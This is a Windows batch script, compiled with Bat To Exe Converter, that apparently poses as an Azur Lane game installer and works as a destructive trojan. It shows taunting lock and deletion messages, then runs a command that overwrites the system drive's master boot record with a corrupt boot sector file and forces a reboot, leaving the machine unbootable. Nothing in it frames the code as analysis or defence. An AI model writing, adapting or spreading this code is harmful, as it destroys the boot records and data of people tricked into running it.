::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFBJaXwGQKHPoDfsqxd/a3c/Kkm4hcOcsc5vUyoiPOvUB5kTqcIAkxG9J1tseAxFdfQaXOFs2sDgW+2WfItXRvw7vTwWN41g7D2pkymrTgyV1adBn+g==
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJhZkkaHErTXA==
::ZQ05rAF9IBncCkqN+0xwdVsFAlbMbCXpZg==
::ZQ05rAF9IAHYFVzEqQIFOx5GDCqNKGK8D7Yd/OH04aq0p18LXeE6OMfu9IfHYKgk40u3J99N
::eg0/rx1wNQPfEVWB+kM9LVsJDDGROXn6KLoI4e7y7OuTq0ITFNE6apnS2bHOaNU92QykPaEk2CkI0as=
::fBEirQZwNQPfEVWB+kM9LVsJDDGROXn6KLoI4e7y7OuTq0ITFNE6apnS2bHOaNU92QykPaEk2CkI0as=
::cRolqwZ3JBvQF1fEqQIFOx5GDCqNKGK8D7Yd/OH04aq0p18LXeE6OMfu9IfHYKgk40u3J99N
::dhA7uBVwLU+EWHCK50ciPAMGR0SmOX3a
::YQ03rBFzNR3SWATE7U0jPBpGARKLLn6pZg==
::dhAmsQZ3MwfNWATE900gMQldSwyWOW/a
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFBJaXwGQKHPoDfsqxd/a3c/Kkm4hcOcsc5vUyoiPOvUB5kTqcIAkxG9J1tseAxFdfQaXfQcxpWIMs3yAVw==
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
cls
title User Notification Service (Coded by Insertx2k Dev) (32-bit)
echo.
echo It looks like you have tried to install Azur lane on your computer, but nah, your computer is now locked!
echo.
echo You can't get rid of this virus that easy.
echo.
echo This virus (ahem, trojan) has also deleted all the files that are yours in : %userprofile%
echo.
echo It looks like you are fooled.
echo.
echo Don't try to get rid of me as I am right now completely injected in your Windows files (in %windir%)
echo.
echo I also corrupted your boot sector, so you can't mess around with your computer again!
echo.
echo Do not try to close this window, else I will play with you for a little bit.
echo.
echo Proudly coded by Insertx2k Dev...
echo.
: ====================================
: Flashing a corrupted bootsector
: ====================================
"%windir%\bmgr.exe" /DEVICE=%systemdrive% /mbr /restore /file="%windir%\bootsect-corrupt.bin" /keep_dpt /quiet
pause
echo.
echo Stupid, I told you to not to try to close this window, You will regret.
ping -w 35 localhost >nul
wmic os where primary=true call reboot
exit